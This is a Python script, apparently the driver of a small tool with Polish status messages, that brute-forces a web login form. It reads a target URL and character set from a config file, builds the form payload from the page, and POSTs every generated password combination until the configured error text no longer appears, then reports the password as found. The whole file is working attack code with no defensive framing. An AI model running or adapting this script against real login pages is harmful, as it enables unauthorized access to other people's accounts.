from config.load_config import Config
from func.inspect_site import inspect_page
from func.prepare_attack import prepare_payload, BruteForce, final_payload
import requests
import time


# Load Config from file:
config = Config()


# Check The Page:
site = inspect_page(config.url)
print(site)

# Prepare Payload:
payload = prepare_payload(site)
print('Dane do logowania beda wygladaly tak:')
print(payload)
print('*' * 50)

# Make Attack Combo
combo = BruteForce(char_length=config.chars_length, chars=config.chars, static_text=config.static)
print('Liczba kombinacji uzytych do ataku: ', combo.length)
print('*' * 100)

# Make Attack Function
def attack(payload, combo_hit):
    #f_payload = final_payload(payload, combo_hit)
    response = requests.post(config.url, data=final_payload(payload, combo_hit))
    if config.error in response.text:
        print(combo_hit, '   not ok')
        return False
    else:
        print('Znalazlem haslo:  ', combo_hit)
        return True    

# Time To Attack 
print('*' * 100)
print('Rozpoczynam Atak !!!')
time.sleep(3)

for hit in combo.combos:
    if attack(payload, hit):
        break
    


    